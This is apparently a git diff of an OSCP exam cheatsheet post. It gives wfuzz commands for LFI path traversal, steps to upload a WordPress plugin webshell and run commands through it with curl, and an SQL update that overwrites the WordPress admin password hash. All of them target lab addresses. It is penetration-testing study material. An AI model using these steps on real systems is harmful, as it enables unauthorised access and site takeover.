@@ -7,17 +7,6 @@ tags: [OSCP, Cheatsheet]
 layout: post
 ---
 
-###### LFI file lists
-```
-https://github.com/hussein98d/LFI-files
-
-Then use the list to find out which ones work:
-> wfuzz -u http://10.10.10.10:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt
-
-Find out how many characters a wrong request is, then filter those out:
-> wfuzz -u http://10.10.10.10:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt -hh 1000
-```
-
 ###### PayloadsAllTheThings
 ```
 Directory traversal
@@ -32,6 +21,24 @@ SQL injection
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 ```
 
+
+###### LFI file lists
+```
+https://github.com/hussein98d/LFI-files
+
+Then use the list to find out which ones work:
+$ wfuzz -u http://10.10.10.10:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt
+
+Find out how many characters a wrong request is, then filter those out:
+$ wfuzz -u http://10.10.10.10:80/index.php/file=../../../../../../../../..FUZZ -w ./list.txt -hh 1000
+```
+
+###### PHP wrappers
+//////////////////TODO:
+
+###### Apache Log Poisoning
+//////////////////TODO:
+
 ###### SQL Cheatsheets
 ```
 Pentestmonkey
@@ -42,18 +49,18 @@ https://blog.cobalt.io/a-pentesters-guide-to-sql-injection-sqli-16fd570c3532
 
 ###### WebDAV
 ```
-> cadaver http://10.10.10.10/
+$ cadaver http://10.10.10.10/
 ```
 
 ###### Wordpress Panel
 ```
 Upload webshell in a plugin
 
-> cp /usr/share/seclists/Web-Shells/Wordpress/plugin-shell.php ./
-> zip plugin-shell.zip plugin-shell.php
+$ cp /usr/share/seclists/Web-Shells/Wordpress/plugin-shell.php ./
+$ zip plugin-shell.zip plugin-shell.php
 
 Upload the ZIP as a plugin. Then run the webshell:
-> curl http://10.10.10.10/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
+$ curl http://10.10.10.10/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
 ```
 
 ###### Example changing a wordpress password in MariaDB
@@ -61,9 +68,9 @@ Upload the ZIP as a plugin. Then run the webshell:
 https://codebeautify.org/wordpress-password-hash-generator
 "password" $P$Bp430d4U/90Jjw8evTcM4ShXGZZkdv0
 
-> UPDATE wp_users SET user_pass = "$P$Bp430d4U/90Jjw8evTcM4ShXGZZkdv0" WHERE ID=1;
+$ UPDATE wp_users SET user_pass = "$P$Bp430d4U/90Jjw8evTcM4ShXGZZkdv0" WHERE ID=1;
 then verify with:
-> select * from wp_users;
+$ select * from wp_users;
 
 Then login with username:"password"
 ```
